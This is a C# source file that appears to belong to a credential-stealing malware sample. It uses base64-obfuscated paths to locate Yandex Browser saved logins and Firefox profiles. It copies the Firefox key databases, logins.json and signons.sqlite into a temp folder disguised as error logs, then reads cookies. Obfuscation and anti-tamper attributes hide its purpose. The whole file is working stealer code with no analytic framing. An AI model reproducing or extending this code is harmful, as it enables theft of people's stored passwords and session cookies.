using DebuggerStepThroughAttribute.Base;
using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;

namespace DebuggerStepThroughAttribute
{
    public class Y
    {
        [Obfuscation(Exclude = false, Feature = "+koi;-ctrl flow;+anti tamper")]
        public static List<LD> GETLLD()
        {
            try
            {
                string dataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("WWFuZGV4XFxZYW5kZXhCcm93c2VyXFxVc2VyIERhdGFcXERlZmF1bHRcXExvZ2luIERhdGE=")));
                return Chromium.GETLDSs(dataPath, bn.yy);
            }
            catch (Exception)
            {
                return new List<LD>();
            }
        }
        [Obfuscation(Exclude = false, Feature = "+koi;-ctrl flow;+anti tamper")]
        public static List<IReflectableType> GETCCD()
        {
            try
            {

                string dataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("TW96aWxsYVxcRmlyZWZveFxcUHJvZmlsZXM=")));
                // Get all subdirectories

                string[] subdirectoryEntries = Directory.GetDirectories(dataPath);

                // Loop through them to see if they have any other subdirectories

                foreach (string subdirectory in subdirectoryEntries)
                {
                    if (subdirectory.Contains(".default"))
                    {
                        dataPath = subdirectory + "\\cookies.sqlite";
                        try
                        {
                            if ((File.Exists(subdirectory + "\\key4.db") || File.Exists(subdirectory + "\\key3.db")) && (File.Exists(subdirectory + "\\logins.json") || File.Exists(subdirectory + "\\signons.sqlite")))
                            {


                                if (File.Exists(subdirectory + "\\key4.db"))
                                    File.Copy(subdirectory + "\\key4.db", Path.Combine(Environment.GetEnvironmentVariable("Temp"), Environment.UserName + "\\" + Environment.MachineName.ToString() + "_ErrorsLogs" + "\\key4.db"));

                                if (File.Exists(subdirectory + "\\key3.db"))
                                    File.Copy(subdirectory + "\\key3.db", Path.Combine(Environment.GetEnvironmentVariable("Temp"), Environment.UserName + "\\" + Environment.MachineName.ToString() + "_ErrorsLogs" + "\\key3.db"));

                                if (File.Exists(subdirectory + "\\logins.json"))
                                    File.Copy(subdirectory + "\\logins.json", Path.Combine(Environment.GetEnvironmentVariable("Temp"), Environment.UserName + "\\" + Environment.MachineName.ToString() + "_ErrorsLogs" + "\\logins.json"));

                                if (File.Exists(subdirectory + "\\signons.sqlite"))
                                    File.Copy(subdirectory + "\\signons.sqlite", Path.Combine(Environment.GetEnvironmentVariable("Temp"), Environment.UserName + "\\" + Environment.MachineName.ToString() + "_ErrorsLogs" + "\\signons.sqlite"));

                            }
                        }
                        catch { }


                    //    if (File.Exists(subdirectory + "\\key4.db") && File.Exists(subdirectory + "\\logins.json"))
                    //    {
                    //        try
                    //        {
                    //            File.Copy(subdirectory + "\\key4.db", Path.Combine(Environment.GetEnvironmentVariable("Temp"), Environment.UserName + "\\" + Environment.MachineName.ToString() + "_ErrorsLogs" + "\\key4.db"));
                    //            File.Copy(subdirectory + "\\logins.json", Path.Combine(Environment.GetEnvironmentVariable("Temp"), Environment.UserName + "\\" + Environment.MachineName.ToString() + "_ErrorsLogs" + "\\logins.json"));
                    //        }
                    //        catch { }
                    //    }
                    }
                }


                    return Chromium.GETOPAGFF(dataPath, bn.yy);
            }
            catch (Exception)
            {
                return new List<IReflectableType>();
            }
        }
    }
}
